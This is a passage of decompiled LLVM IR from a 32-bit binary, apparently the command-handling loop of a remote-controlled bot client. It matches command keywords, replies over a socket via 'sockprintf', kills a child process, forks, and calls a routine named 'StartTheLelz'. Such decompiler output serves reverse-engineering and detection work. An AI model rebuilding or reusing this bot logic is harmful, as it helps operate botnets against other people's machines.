  %v2_804d6ac = ashr i32 %storemerge20, 31
  store i32 %v2_804d6ac, i32* %edx.global-to-local, align 4
  %v0_804d6b5 = load i32, i32* @global_var_8055428.28, align 8
  store i32 %v0_804d6b5, i32* @esi, align 4
  %v0_804d6bb = load i32, i32* @global_var_805542c.29, align 4
  store i32 %v0_804d6bb, i32* @edi, align 4
  %v10_804d6d3 = icmp ult i32 %v2_804d6ac, %v0_804d6bb
  store i1 %v10_804d6d3, i1* %cf.global-to-local, align 1
  br i1 %v10_804d6d3, label %dec_label_pc_804d4f8, label %dec_label_pc_804d6df

dec_label_pc_804d6df:                             ; preds = %dec_label_pc_804d6a1
  store i32 %v0_804d6bb, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v6_804d6eb = icmp ugt i32 %v2_804d6ac, %v0_804d6bb
  br i1 %v6_804d6eb, label %dec_label_pc_804d6ff, label %dec_label_pc_804d6ed

dec_label_pc_804d6ed:                             ; preds = %dec_label_pc_804d6df
  store i32 %v0_804d6b5, i32* %edx.global-to-local, align 4
  %v10_804d6f3 = icmp ult i32 %storemerge20, %v0_804d6b5
  store i1 %v10_804d6f3, i1* %cf.global-to-local, align 1
  br i1 %v10_804d6f3, label %dec_label_pc_804d4f8, label %dec_label_pc_804d6ff

dec_label_pc_804d6ff:                             ; preds = %dec_label_pc_804d6ed, %dec_label_pc_804d6df
  %v0_804d702 = load i32, i32* @ebp, align 4
  %v2_804d702 = add i32 %v0_804dcf3, -5244
  %v3_804d702 = add i32 %v2_804d702, %v0_804d702
  %v4_804d702 = inttoptr i32 %v3_804d702 to i8*
  store i8 0, i8* %v4_804d702, align 1
  %v0_804d70a = load i32, i32* @esp, align 4
  %v5_804d70a = icmp ult i32 %v0_804d70a, 12
  store i1 %v5_804d70a, i1* %cf.global-to-local, align 1
  store i32 %v2_804dcdd, i32* %eax.global-to-local, align 4
  %v2_804d713 = add i32 %v0_804d70a, -16
  %v3_804d713 = inttoptr i32 %v2_804d713 to i32*
  store i32 %v2_804dcdd, i32* %v3_804d713, align 4
  %v0_804d714 = call i32 @trim()
  store i32 %v0_804d714, i32* %eax.global-to-local, align 4
  %v0_804d719 = load i32, i32* @esp, align 4
  %v2_804d719 = icmp ugt i32 %v0_804d719, -17
  store i1 %v2_804d719, i1* %cf.global-to-local, align 1
  %v3_804d722 = load i32, i32* %v2_804d33a, align 4
  store i32 %v3_804d722, i32* %eax.global-to-local, align 4
  %v1_804d725 = inttoptr i32 %v3_804d722 to i32*
  %v2_804d725 = load i32, i32* %v1_804d725, align 4
  store i32 %v2_804d725, i32* %eax.global-to-local, align 4
  %v4_804d742 = inttoptr i32 %v2_804d725 to i8*
  store i32 %v2_804d725, i32* @esi, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_8052adb.77 to i32), i32* @edi, align 4
  %v7_804d754 = call i32 @_strncmp(i8* %v4_804d742, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8052adb.77, i32 0, i32 0), i32 8)
  %v8_804d754 = urem i32 %v7_804d754, 2
  %v9_804d754 = icmp eq i32 %v8_804d754, 0
  %v0_804d756 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d756 = or i1 %v0_804d756, %v9_804d754
  %v3_804d756 = zext i1 %v2_804d756 to i32
  %v4_804d756 = load i32, i32* @edx, align 4
  %v5_804d756 = and i32 %v4_804d756, -256
  %v6_804d756 = or i32 %v3_804d756, %v5_804d756
  %v7_804d756 = xor i32 %v6_804d756, 1
  store i32 %v7_804d756, i32* %edx.global-to-local, align 4
  %v1_804d75e = trunc i32 %v7_804d756 to i8
  %v3_804d75e = zext i1 %v0_804d756 to i8
  %v4_804d75e = sub nsw i8 %v1_804d75e, %v3_804d75e
  %v15_804d75e = icmp eq i8 %v4_804d75e, 0
  %v2_804d762 = sext i8 %v4_804d75e to i32
  store i32 %v2_804d762, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d767 = icmp eq i1 %v15_804d75e, false
  br i1 %v1_804d767, label %dec_label_pc_804d8e2, label %dec_label_pc_804d76d

dec_label_pc_804d76d:                             ; preds = %dec_label_pc_804d6ff
  store i32 %v2_804d2d1, i32* @esi, align 4
  %v2_804d773 = load i32, i32* %stack_var_4, align 4
  %v7_804d773 = icmp ult i32 %v2_804d773, 2
  store i1 %v7_804d773, i1* %cf.global-to-local, align 1
  %v11_804d773 = icmp eq i32 %v2_804d773, 2
  br i1 %v11_804d773, label %dec_label_pc_804d793, label %dec_label_pc_804d778

dec_label_pc_804d778:                             ; preds = %dec_label_pc_804d76d
  %v0_804d778 = load i32, i32* @global_var_8055420.26, align 32
  store i32 %v0_804d778, i32* %eax.global-to-local, align 4
  %v0_804d77d = load i32, i32* @esp, align 4
  %v5_804d77d = icmp ult i32 %v0_804d77d, 8
  store i1 %v5_804d77d, i1* %cf.global-to-local, align 1
  %v1_804d780 = add i32 %v0_804d77d, -12
  %v2_804d780 = inttoptr i32 %v1_804d780 to i32*
  store i32 ptrtoint ([17 x i8]* @global_var_8052ae3.78 to i32), i32* %v2_804d780, align 4
  %v0_804d785 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d785 = add i32 %v0_804d77d, -16
  %v3_804d785 = inttoptr i32 %v2_804d785 to i32*
  store i32 %v0_804d785, i32* %v3_804d785, align 4
  %v3_804d786 = call i32 @sockprintf(i32 8, i32 ptrtoint ([8 x i8]* @global_var_8052adb.77 to i32))
  store i32 %v3_804d786, i32* %eax.global-to-local, align 4
  %v0_804d78b = load i32, i32* @esp, align 4
  %v2_804d78b = icmp ugt i32 %v0_804d78b, -17
  store i1 %v2_804d78b, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804dd0d

dec_label_pc_804d793:                             ; preds = %dec_label_pc_804d76d
  %v3_804d799 = load i32, i32* %v2_804d33a, align 4
  %v1_804d79c = add i32 %v3_804d799, 4
  %v5_804d79c = icmp ugt i32 %v3_804d799, -5
  store i1 %v5_804d79c, i1* %cf.global-to-local, align 1
  store i32 %v1_804d79c, i32* %eax.global-to-local, align 4
  %v1_804d79f = inttoptr i32 %v1_804d79c to i32*
  %v2_804d79f = load i32, i32* %v1_804d79f, align 4
  store i32 %v2_804d79f, i32* %eax.global-to-local, align 4
  %v4_804d7bc = inttoptr i32 %v2_804d79f to i8*
  store i32 %v2_804d79f, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8052af4.79 to i32), i32* @edi, align 4
  %v7_804d7ce = call i32 @_strncmp(i8* %v4_804d7bc, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8052af4.79, i32 0, i32 0), i32 4)
  %v8_804d7ce = urem i32 %v7_804d7ce, 2
  %v9_804d7ce = icmp eq i32 %v8_804d7ce, 0
  %v0_804d7d0 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d7d0 = or i1 %v0_804d7d0, %v9_804d7ce
  %v3_804d7d0 = zext i1 %v2_804d7d0 to i32
  %v4_804d7d0 = load i32, i32* %edx.global-to-local, align 4
  %v5_804d7d0 = and i32 %v4_804d7d0, -256
  %v6_804d7d0 = or i32 %v3_804d7d0, %v5_804d7d0
  %v7_804d7d0 = xor i32 %v6_804d7d0, 1
  store i32 %v7_804d7d0, i32* @edx, align 4
  %v1_804d7d8 = trunc i32 %v7_804d7d0 to i8
  %v3_804d7d8 = zext i1 %v0_804d7d0 to i8
  %v4_804d7d8 = sub nsw i8 %v1_804d7d8, %v3_804d7d8
  %v15_804d7d8 = icmp eq i8 %v4_804d7d8, 0
  %v2_804d7dc = sext i8 %v4_804d7d8 to i32
  store i32 %v2_804d7dc, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d7e1 = icmp eq i1 %v15_804d7d8, false
  br i1 %v1_804d7e1, label %dec_label_pc_804d823, label %dec_label_pc_804d7e3

dec_label_pc_804d7e3:                             ; preds = %dec_label_pc_804d793
  %v0_804d7e3 = load i32, i32* @global_var_805b4a4.80, align 4
  store i32 %v0_804d7e3, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d7e8 = icmp eq i32 %v0_804d7e3, 0
  br i1 %v1_804d7e8, label %dec_label_pc_804dd0d, label %dec_label_pc_804d7f0

dec_label_pc_804d7f0:                             ; preds = %dec_label_pc_804d7e3
  %v0_804d7f0 = load i32, i32* @global_var_8055420.26, align 32
  store i32 %v0_804d7f0, i32* %eax.global-to-local, align 4
  %v0_804d7f5 = load i32, i32* @esp, align 4
  %v5_804d7f5 = icmp ult i32 %v0_804d7f5, 8
  store i1 %v5_804d7f5, i1* %cf.global-to-local, align 1
  %v1_804d7f8 = add i32 %v0_804d7f5, -12
  %v2_804d7f8 = inttoptr i32 %v1_804d7f8 to i32*
  store i32 ptrtoint ([17 x i8]* @global_var_8052af8.81 to i32), i32* %v2_804d7f8, align 4
  %v0_804d7fd = load i32, i32* %eax.global-to-local, align 4
  %v2_804d7fd = add i32 %v0_804d7f5, -16
  %v3_804d7fd = inttoptr i32 %v2_804d7fd to i32*
  store i32 %v0_804d7fd, i32* %v3_804d7fd, align 4
  %v3_804d7fe = call i32 @sockprintf(i32 4, i32 ptrtoint ([4 x i8]* @global_var_8052af4.79 to i32))
  %v0_804d803 = load i32, i32* @esp, align 4
  %v0_804d806 = load i32, i32* @global_var_805b4a4.80, align 4
  store i32 %v0_804d806, i32* %eax.global-to-local, align 4
  %tmp295 = and i32 %v0_804d803, -8
  %v5_804d80b = icmp eq i32 %tmp295, -16
  store i1 %v5_804d80b, i1* %cf.global-to-local, align 1
  %v1_804d80e = add i32 %v0_804d803, 4
  %v2_804d80e = inttoptr i32 %v1_804d80e to i32*
  store i32 9, i32* %v2_804d80e, align 4
  %v0_804d810 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d810 = inttoptr i32 %v0_804d803 to i32*
  store i32 %v0_804d810, i32* %v3_804d810, align 4
  %v3_804d811 = call i32 @kill(i32 4, i32 ptrtoint ([4 x i8]* @global_var_8052af4.79 to i32))
  store i32 %v3_804d811, i32* %eax.global-to-local, align 4
  %v0_804d816 = load i32, i32* @esp, align 4
  %v2_804d816 = icmp ugt i32 %v0_804d816, -17
  store i1 %v2_804d816, i1* %cf.global-to-local, align 1
  store i32 0, i32* @global_var_805b4a4.80, align 4
  br label %dec_label_pc_804d823

dec_label_pc_804d823:                             ; preds = %dec_label_pc_804d793, %dec_label_pc_804d7f0
  %v3_804d829 = load i32, i32* %v2_804d33a, align 4
  %v1_804d82c = add i32 %v3_804d829, 4
  %v5_804d82c = icmp ugt i32 %v3_804d829, -5
  store i1 %v5_804d82c, i1* %cf.global-to-local, align 1
  store i32 %v1_804d82c, i32* %eax.global-to-local, align 4
  %v1_804d82f = inttoptr i32 %v1_804d82c to i32*
  %v2_804d82f = load i32, i32* %v1_804d82f, align 4
  store i32 %v2_804d82f, i32* %eax.global-to-local, align 4
  %v4_804d84c = inttoptr i32 %v2_804d82f to i8*
  store i32 %v2_804d82f, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8052b09.82 to i32), i32* @edi, align 4
  %v7_804d85e = call i32 @_strncmp(i8* %v4_804d84c, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8052b09.82, i32 0, i32 0), i32 3)
  %v8_804d85e = urem i32 %v7_804d85e, 2
  %v9_804d85e = icmp eq i32 %v8_804d85e, 0
  %v0_804d860 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d860 = or i1 %v0_804d860, %v9_804d85e
  %v3_804d860 = zext i1 %v2_804d860 to i32
  %v4_804d860 = load i32, i32* @edx, align 4
  %v5_804d860 = and i32 %v4_804d860, -256
  %v6_804d860 = or i32 %v3_804d860, %v5_804d860
  %v7_804d860 = xor i32 %v6_804d860, 1
  store i32 %v7_804d860, i32* %edx.global-to-local, align 4
  %v1_804d868 = trunc i32 %v7_804d860 to i8
  %v3_804d868 = zext i1 %v0_804d860 to i8
  %v4_804d868 = sub nsw i8 %v1_804d868, %v3_804d868
  %v15_804d868 = icmp eq i8 %v4_804d868, 0
  %v2_804d86c = sext i8 %v4_804d868 to i32
  store i32 %v2_804d86c, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d871 = icmp eq i1 %v15_804d868, false
  br i1 %v1_804d871, label %dec_label_pc_804d8e2, label %dec_label_pc_804d873

dec_label_pc_804d873:                             ; preds = %dec_label_pc_804d823
  %v0_804d873 = load i32, i32* @global_var_805b4a4.80, align 4
  store i32 %v0_804d873, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d878 = icmp eq i32 %v0_804d873, 0
  %v1_804d87a = icmp eq i1 %v1_804d878, false
  br i1 %v1_804d87a, label %dec_label_pc_804dd0d, label %dec_label_pc_804d880

dec_label_pc_804d880:                             ; preds = %dec_label_pc_804d873
  %v1_804d880 = call i32 @__libc_fork(i32 3)
  store i32 %v1_804d880, i32* %eax.global-to-local, align 4
  %v0_804d888 = load i32, i32* @esp, align 4
  %v5_804d888 = icmp ult i32 %v0_804d888, 12
  store i1 %v5_804d888, i1* %cf.global-to-local, align 1
  %v1_804d88b = add i32 %v0_804d888, -16
  %v2_804d88b = inttoptr i32 %v1_804d88b to i32*
  store i32 ptrtoint ([28 x i8]* @global_var_8052b0c.83 to i32), i32* %v2_804d88b, align 4
  %v1_804d890 = call i32 @puts(i32 %v1_804d880)
  %v0_804d895 = load i32, i32* @esp, align 4
  %v0_804d898 = load i32, i32* @global_var_8055420.26, align 32
  store i32 %v0_804d898, i32* %eax.global-to-local, align 4
  %tmp296 = and i32 %v0_804d895, -8
  %v5_804d89d = icmp eq i32 %tmp296, -16
  store i1 %v5_804d89d, i1* %cf.global-to-local, align 1
  %v1_804d8a0 = add i32 %v0_804d895, 4
  %v2_804d8a0 = inttoptr i32 %v1_804d8a0 to i32*
  store i32 ptrtoint ([17 x i8]* @global_var_8052b28.84 to i32), i32* %v2_804d8a0, align 4
  %v0_804d8a5 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d8a5 = inttoptr i32 %v0_804d895 to i32*
  store i32 %v0_804d8a5, i32* %v3_804d8a5, align 4
  %v3_804d8a6 = call i32 @sockprintf(i32 %v1_804d880, i32 %v2_804d913)
  store i32 %v3_804d8a6, i32* %eax.global-to-local, align 4
  %v0_804d8ab = load i32, i32* @esp, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d8ae = icmp eq i32 %v1_804d880, 0
  br i1 %v4_804d8ae, label %dec_label_pc_804d8cb, label %dec_label_pc_804d8b4

dec_label_pc_804d8b4:                             ; preds = %dec_label_pc_804d880
  store i32 %v1_804d880, i32* %eax.global-to-local, align 4
  store i32 %v1_804d880, i32* @global_var_805b4a4.80, align 4
  br label %dec_label_pc_804dd0d

dec_label_pc_804d8cb:                             ; preds = %dec_label_pc_804d880
  %v1_804d8ab = add i32 %v0_804d8ab, 16
  %v5_804d8cb = icmp ult i32 %v1_804d8ab, 12
  store i1 %v5_804d8cb, i1* %cf.global-to-local, align 1
  %v2_804d8ce = inttoptr i32 %v0_804d8ab to i32*
  store i32 1, i32* %v2_804d8ce, align 4
  %v0_804d8d0 = call i32 @StartTheLelz()
  store i32 %v0_804d8d0, i32* %eax.global-to-local, align 4
  %v0_804d8d5 = load i32, i32* @esp, align 4
  %v1_804d8d5 = add i32 %v0_804d8d5, 16
  %v5_804d8d8 = icmp ult i32 %v1_804d8d5, 12
  store i1 %v5_804d8d8, i1* %cf.global-to-local, align 1
  %v2_804d8db = inttoptr i32 %v0_804d8d5 to i32*
  store i32 0, i32* %v2_804d8db, align 4
  %v1_804d8dd = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804d8e2:                             ; preds = %dec_label_pc_804d823, %dec_label_pc_804d6ff
  %v0_804d8e2 = load i32, i32* @esp, align 4
  %v5_804d8e2 = icmp ult i32 %v0_804d8e2, 8
  store i1 %v5_804d8e2, i1* %cf.global-to-local, align 1
  %v1_804d8e5 = add i32 %v0_804d8e2, -12
  %v2_804d8e5 = inttoptr i32 %v1_804d8e5 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8052977.27 to i32), i32* %v2_804d8e5, align 4
  store i32 %v2_804dcdd, i32* %eax.global-to-local, align 4
  %v2_804d8f0 = add i32 %v0_804d8e2, -16
  %v3_804d8f0 = inttoptr i32 %v2_804d8f0 to i32*
  store i32 %v2_804dcdd, i32* %v3_804d8f0, align 4
  %v4_804d8f1 = call i32 @strstr(i32 %tmp134, i8* %stack_var_-52.1.ph31)
  %v0_804d8f6 = load i32, i32* @esp, align 4
  %v1_804d8f6 = add i32 %v0_804d8f6, 16
  store i32 %v4_804d8f1, i32* %edx.global-to-local, align 4
  store i32 %v2_804dcdd, i32* %eax.global-to-local, align 4
  %v7_804d901 = icmp ult i32 %v4_804d8f1, %v2_804dcdd
  store i1 %v7_804d901, i1* %cf.global-to-local, align 1
  %v12_804d901 = icmp eq i32 %v4_804d8f1, %v2_804dcdd
  %v1_804d903 = icmp eq i1 %v12_804d901, false
  br i1 %v1_804d903, label %dec_label_pc_804d920, label %dec_label_pc_804d905

dec_label_pc_804d905:                             ; preds = %dec_label_pc_804d8e2
  %v0_804d905 = load i32, i32* @global_var_8055420.26, align 32
  store i32 %v0_804d905, i32* %eax.global-to-local, align 4
  %v5_804d90a = icmp ult i32 %v1_804d8f6, 8
  store i1 %v5_804d90a, i1* %cf.global-to-local, align 1
  %v1_804d90d = add i32 %v0_804d8f6, 4
  %v2_804d90d = inttoptr i32 %v1_804d90d to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8052b39.85 to i32), i32* %v2_804d90d, align 4
  %v0_804d912 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d912 = inttoptr i32 %v0_804d8f6 to i32*
  store i32 %v0_804d912, i32* %v3_804d912, align 4
  %v3_804d913 = call i32 @sockprintf(i32 %tmp134, i32 %v2_804d913)
  store i32 %v3_804d913, i32* %eax.global-to-local, align 4
  %v0_804d918 = load i32, i32* @esp, align 4
  %v1_804d918 = add i32 %v0_804d918, 16
  %v2_804d918 = icmp ugt i32 %v0_804d918, -17
  store i1 %v2_804d918, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804dcdd

dec_label_pc_804d920:                             ; preds = %dec_label_pc_804d8e2
  %v5_804d920 = icmp ult i32 %v1_804d8f6, 8
  store i1 %v5_804d920, i1* %cf.global-to-local, align 1
  %v1_804d923 = add i32 %v0_804d8f6, 4
  %v2_804d923 = inttoptr i32 %v1_804d923 to i32*
  store i32 ptrtoint ([4 x i8]* @global_var_8052b3e.86 to i32), i32* %v2_804d923, align 4
  store i32 %v2_804dcdd, i32* %eax.global-to-local, align 4
  %v3_804d92e = inttoptr i32 %v0_804d8f6 to i32*
  store i32 %v2_804dcdd, i32* %v3_804d92e, align 4
  %v4_804d92f = call i32 @strstr(i32 %tmp134, i8* %stack_var_-52.1.ph31)
  %v0_804d934 = load i32, i32* @esp, align 4
  store i32 %v4_804d92f, i32* @edx, align 4
  store i32 %v2_804dcdd, i32* @eax, align 4
  %v7_804d93f = icmp ult i32 %v4_804d92f, %v2_804dcdd
  store i1 %v7_804d93f, i1* %cf.global-to-local, align 1
  %v12_804d93f = icmp eq i32 %v4_804d92f, %v2_804dcdd
  %v1_804d941 = icmp eq i1 %v12_804d93f, false
  br i1 %v1_804d941, label %dec_label_pc_804d94d, label %dec_label_pc_804d943

dec_label_pc_804d943:                             ; preds = %dec_label_pc_804d920
  %v1_804d934 = add i32 %v0_804d934, 16
  %v5_804d943 = icmp ult i32 %v1_804d934, 12
  store i1 %v5_804d943, i1* %cf.global-to-local, align 1
  %v2_804d946 = inttoptr i32 %v0_804d934 to i32*
  store i32 0, i32* %v2_804d946, align 4
  %v1_804d948 = call i32 @__GI_exit(i32 %tmp134)
  store i32 %v1_804d948, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d94d

dec_label_pc_804d94d:                             ; preds = %dec_label_pc_804d920, %dec_label_pc_804d943
  %v2_804d959 = load i8, i8* %tmp189, align 4
  %v3_804d959 = zext i8 %v2_804d959 to i32
  %v6_804d959 = or i32 %v3_804d959, %v5_804d959
  store i32 %v6_804d959, i32* %eax.global-to-local, align 4
  %v6_804d95b = icmp ult i8 %v2_804d959, 33
  store i1 %v6_804d95b, i1* %cf.global-to-local, align 1
  %v10_804d95b = icmp eq i8 %v2_804d959, 33
  %v1_804d95d = icmp eq i1 %v10_804d95b, false
  br i1 %v1_804d95d, label %dec_label_pc_804dcdd.outer34, label %dec_label_pc_804d963

dec_label_pc_804d963:                             ; preds = %dec_label_pc_804d94d
  store i32 %v1_804d966, i32* %eax.global-to-local, align 4
  %v2_804d972217 = load i8, i8* %storemerge19216, align 1
  %v3_804d972218 = zext i8 %v2_804d972217 to i32
  %v6_804d972220 = or i32 %v3_804d972218, %v5_804d959
  store i32 %v6_804d972220, i32* %eax.global-to-local, align 4
  %v3_804d974221 = icmp ult i8 %v2_804d972217, 32
  store i1 %v3_804d974221, i1* %cf.global-to-local, align 1
  %v7_804d974222 = icmp eq i8 %v2_804d972217, 32
  br i1 %v7_804d974222, label %dec_label_pc_804d981, label %dec_label_pc_804d978

dec_label_pc_804d96c:                             ; preds = %dec_label_pc_804d978
  %v5_804d96c = add i32 %storemerge19.in223, 1
  %storemerge19 = inttoptr i32 %v5_804d96c to i8*
  store i32 %v5_804d96c, i32* %eax.global-to-local, align 4
  %v2_804d972 = load i8, i8* %storemerge19, align 1
  %v3_804d972 = zext i8 %v2_804d972 to i32
  %v5_804d972 = and i32 %v5_804d96c, -256
  %v6_804d972 = or i32 %v3_804d972, %v5_804d972
  store i32 %v6_804d972, i32* %eax.global-to-local, align 4
  %v3_804d974 = icmp ult i8 %v2_804d972, 32
  store i1 %v3_804d974, i1* %cf.global-to-local, align 1
  %v7_804d974 = icmp eq i8 %v2_804d972, 32
  br i1 %v7_804d974, label %dec_label_pc_804d981, label %dec_label_pc_804d978

dec_label_pc_804d978:                             ; preds = %dec_label_pc_804d963, %dec_label_pc_804d96c
  %v5_804d972225 = phi i32 [ %v5_804d972, %dec_label_pc_804d96c ], [ %v5_804d959, %dec_label_pc_804d963 ]
  %storemerge19224 = phi i8* [ %storemerge19, %dec_label_pc_804d96c ], [ %storemerge19216, %dec_label_pc_804d963 ]
  %storemerge19.in223 = phi i32 [ %v5_804d96c, %dec_label_pc_804d96c ], [ %v1_804d966, %dec_label_pc_804d963 ]
  store i32 %storemerge19.in223, i32* %eax.global-to-local, align 4
  %v2_804d97b = load i8, i8* %storemerge19224, align 1
  %v3_804d97b = zext i8 %v2_804d97b to i32
  %v6_804d97b = or i32 %v3_804d97b, %v5_804d972225
  store i32 %v6_804d97b, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d97d = icmp eq i8 %v2_804d97b, 0
  %v1_804d97f = icmp eq i1 %v4_804d97d, false
  br i1 %v1_804d97f, label %dec_label_pc_804d96c, label %dec_label_pc_804d981

dec_label_pc_804d981:                             ; preds = %dec_label_pc_804d96c, %dec_label_pc_804d978, %dec_label_pc_804d963
  %storemerge19.in.lcssa = phi i32 [ %v1_804d966, %dec_label_pc_804d963 ], [ %storemerge19.in223, %dec_label_pc_804d978 ], [ %v5_804d96c, %dec_label_pc_804d96c ]
  %storemerge19.lcssa = phi i8* [ %storemerge19216, %dec_label_pc_804d963 ], [ %storemerge19224, %dec_label_pc_804d978 ], [ %storemerge19, %dec_label_pc_804d96c ]
  %v5_804d972.lcssa = phi i32 [ %v5_804d959, %dec_label_pc_804d963 ], [ %v5_804d972225, %dec_label_pc_804d978 ], [ %v5_804d972, %dec_label_pc_804d96c ]
  store i32 %storemerge19.in.lcssa, i32* %eax.global-to-local, align 4
  %v2_804d984 = load i8, i8* %storemerge19.lcssa, align 1
  %v3_804d984 = zext i8 %v2_804d984 to i32
  %v6_804d984 = or i32 %v3_804d984, %v5_804d972.lcssa
  store i32 %v6_804d984, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d986 = icmp eq i8 %v2_804d984, 0
  br i1 %v4_804d986, label %dec_label_pc_804dcdd.outer30, label %dec_label_pc_804d98e

dec_label_pc_804d98e:                             ; preds = %dec_label_pc_804d981
  store i8 0, i8* %storemerge19.lcssa, align 1
  store i32 %v5_804d959, i32* %eax.global-to-local, align 4
  %v3_804d9b2 = call i32 @_strlen(i8* %storemerge19216)
  %v6_804d9b9 = add i32 %v2_804dcdd, %v3_804d9b2
  %v1_804d9bc = add i32 %v6_804d9b9, 2
  %v5_804d9bc = icmp ugt i32 %v6_804d9b9, -3
  store i1 %v5_804d9bc, i1* %cf.global-to-local, align 1
  store i32 %v1_804d9bc, i32* %eax.global-to-local, align 4
  %v5_804d9bf = inttoptr i32 %v1_804d9bc to i8*
  %v1_804d9f7 = and i32 %v1_804d9bc, -256
  br label %dec_label_pc_804d9e9

dec_label_pc_804d9c4:                             ; preds = %dec_label_pc_804da11, %dec_label_pc_804d9e9
  store i32 %v1_804d9f7, i32* %eax.global-to-local, align 4
  %v3_804d9db = call i32 @_strlen(i8* %v5_804d9bf)
  %v4_804d9db = mul i32 %v3_804d9db, -1
  %v1_804d9e1 = sub i32 0, %v4_804d9db
  %v6_804d9e2 = sub i32 %v1_804d9bc, %v4_804d9db
  %v11_804d9e2 = icmp ult i32 %v6_804d9e2, %v1_804d9e1
  store i1 %v11_804d9e2, i1* %cf.global-to-local, align 1
  %v1_804d9e5 = add i32 %v6_804d9e2, -1
  store i32 %v1_804d9e5, i32* %eax.global-to-local, align 4
  %v1_804d9e6 = inttoptr i32 %v1_804d9e5 to i8*
  store i8 0, i8* %v1_804d9e6, align 1
  br label %dec_label_pc_804d9e9

dec_label_pc_804d9e9:                             ; preds = %dec_label_pc_804d98e, %dec_label_pc_804d9c4
  store i32 %v1_804d9f7, i32* %eax.global-to-local, align 4
  %v3_804da00 = call i32 @_strlen(i8* %v5_804d9bf)
  %v4_804da00 = mul i32 %v3_804da00, -1
  %v1_804da06 = sub i32 0, %v4_804da00
  %v6_804da07 = sub i32 %v1_804d9bc, %v4_804da00
  %v11_804da07 = icmp ult i32 %v6_804da07, %v1_804da06
  store i1 %v11_804da07, i1* %cf.global-to-local, align 1
  %v1_804da0a = add i32 %v6_804da07, -1
  store i32 %v1_804da0a, i32* %eax.global-to-local, align 4
  %v1_804da0b = inttoptr i32 %v1_804da0a to i8*
  %v2_804da0b = load i8, i8* %v1_804da0b, align 1
  %v3_804da0b = zext i8 %v2_804da0b to i32
  %v5_804da0b = and i32 %v1_804da0a, -256
  %v6_804da0b = or i32 %v3_804da0b, %v5_804da0b
  store i32 %v6_804da0b, i32* %eax.global-to-local, align 4
  %v6_804da0d = icmp ult i8 %v2_804da0b, 10
  store i1 %v6_804da0d, i1* %cf.global-to-local, align 1
  %v10_804da0d = icmp eq i8 %v2_804da0b, 10
  br i1 %v10_804da0d, label %dec_label_pc_804d9c4, label %dec_label_pc_804da11

dec_label_pc_804da11:                             ; preds = %dec_label_pc_804d9e9
  store i32 %v1_804d9f7, i32* %eax.global-to-local, align 4
  %v3_804da28 = call i32 @_strlen(i8* %v5_804d9bf)
  %v4_804da28 = mul i32 %v3_804da28, -1
  %v1_804da2e = sub i32 0, %v4_804da28
  %v6_804da2f = sub i32 %v1_804d9bc, %v4_804da28
  %v11_804da2f = icmp ult i32 %v6_804da2f, %v1_804da2e
  store i1 %v11_804da2f, i1* %cf.global-to-local, align 1
  %v1_804da32 = add i32 %v6_804da2f, -1
  store i32 %v1_804da32, i32* %eax.global-to-local, align 4
  %v1_804da33 = inttoptr i32 %v1_804da32 to i8*
  %v2_804da33 = load i8, i8* %v1_804da33, align 1
  %v3_804da33 = zext i8 %v2_804da33 to i32
  %v5_804da33 = and i32 %v1_804da32, -256
  %v6_804da33 = or i32 %v3_804da33, %v5_804da33
  store i32 %v6_804da33, i32* %eax.global-to-local, align 4
  %v6_804da35 = icmp ult i8 %v2_804da33, 13
  store i1 %v6_804da35, i1* %cf.global-to-local, align 1
  %v10_804da35 = icmp eq i8 %v2_804da33, 13
  br i1 %v10_804da35, label %dec_label_pc_804d9c4, label %dec_label_pc_804da39

dec_label_pc_804da39:                             ; preds = %dec_label_pc_804da11
  store i32 %v1_804d9bc, i32* %eax.global-to-local, align 4
  %v2_804da47232 = load i8, i8* %v5_804d9bf, align 1
  %v3_804da47233 = zext i8 %v2_804da47232 to i32
  %v6_804da47235 = or i32 %v3_804da47233, %v1_804d9f7
  store i32 %v6_804da47235, i32* %eax.global-to-local, align 4
  %v3_804da49236 = icmp ult i8 %v2_804da47232, 32
  store i1 %v3_804da49236, i1* %cf.global-to-local, align 1
  %v7_804da49237 = icmp eq i8 %v2_804da47232, 32
  br i1 %v7_804da49237, label %dec_label_pc_804da56, label %dec_label_pc_804da4d

dec_label_pc_804da41:                             ; preds = %dec_label_pc_804da4d
  %v5_804da41 = add i32 %v4_804da44239, 1
  %v22_804da41 = inttoptr i32 %v5_804da41 to i8*
  store i32 %v5_804da41, i32* %eax.global-to-local, align 4
  %v2_804da47 = load i8, i8* %v22_804da41, align 1
  %v3_804da47 = zext i8 %v2_804da47 to i32
  %v5_804da47 = and i32 %v5_804da41, -256
  %v6_804da47 = or i32 %v3_804da47, %v5_804da47
  store i32 %v6_804da47, i32* %eax.global-to-local, align 4
  %v3_804da49 = icmp ult i8 %v2_804da47, 32
  store i1 %v3_804da49, i1* %cf.global-to-local, align 1
  %v7_804da49 = icmp eq i8 %v2_804da47, 32
